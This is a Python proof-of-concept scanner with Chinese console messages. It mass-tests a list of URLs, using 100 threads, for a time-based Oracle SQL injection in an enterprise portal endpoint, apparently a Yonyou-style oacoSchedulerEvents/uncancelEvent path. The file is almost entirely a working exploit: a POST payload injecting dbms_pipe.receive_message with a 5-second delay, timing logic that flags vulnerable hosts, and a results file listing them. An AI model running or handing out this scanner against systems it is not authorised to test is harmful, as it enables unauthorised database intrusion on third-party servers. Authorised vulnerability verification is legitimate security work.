import requests
import threading
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

POC_METHOD = "POST"
POC_PATH = "/portal/pt/oacoSchedulerEvents/uncancelEvent?pageId=login"
POC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
POC_DATA = "event_id=-1'AND 1=dbms_pipe.receive_message('RDS',5)--+#+&startDate=2025-06-26-12:12:12&event_ts=2025-06-26-12:12:12&event ts=2025-06-26 12:12:12"

def test_url(target_url):
    try:
        full_url = urljoin(target_url, POC_PATH)
        start_time = time.time()
        response = requests.request(
            method=POC_METHOD,
            url=full_url,
            headers=POC_HEADERS,
            data=POC_DATA,
            verify=False,
            timeout=10,
            allow_redirects=False 
        )
        response_time = time.time() - start_time
        if 300 <= response.status_code < 400:
            print(f"[INFO] {target_url} - 状态码 {response.status_code} (3xx重定向)，漏洞不存在")
            return None
        
        elif response.status_code == 200 and response_time >= 5:
            result = {
                'url': target_url,
                'status_code': response.status_code,
                'response_time': round(response_time, 2),
                'full_url': full_url
            }
            print(f"[VULNERABLE] {target_url} - 状态码 {response.status_code}, 响应时间 {response_time:.2f}s - 漏洞存在!")
            return result
        
        else:
            print(f"[INFO] {target_url} - 状态码 {response.status_code}, 响应时间 {response_time:.2f}s - 漏洞不存在")
            return None
            
    except requests.exceptions.Timeout:
        print(f"[ERROR] {target_url} - 请求超时")
        return None
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] {target_url} - 连接错误")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {target_url} - 请求异常: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {target_url} - 未知错误: {str(e)}")
        return None

def main():
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有有效的URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: 100")
    print("-" * 60)
    
    vulnerable_results = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_url = {executor.submit(test_url, url): url for url in urls}
        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_results.append(result)
    if vulnerable_results:
        try:
            with open('result.txt', 'w', encoding='utf-8') as f:
                f.write("发现的漏洞详情:\n")
                f.write("=" * 80 + "\n")
                for i, result in enumerate(vulnerable_results, 1):
                    f.write(f"{i}. 目标URL: {result['url']}\n")
                    f.write(f"   完整请求URL: {result['full_url']}\n")
                    f.write(f"   状态码: {result['status_code']}\n")
                    f.write(f"   响应时间: {result['response_time']}秒\n")
                    f.write("-" * 80 + "\n")
            
            print(f"\n[SUCCESS] 发现 {len(vulnerable_results)} 个存在漏洞的URL，详情已保存到 result.txt")
        except Exception as e:
            print(f"[ERROR] 写入result.txt文件失败: {str(e)}")
    else:
        print(f"\n[INFO] 未发现存在漏洞的URL")

if __name__ == "__main__":
    main()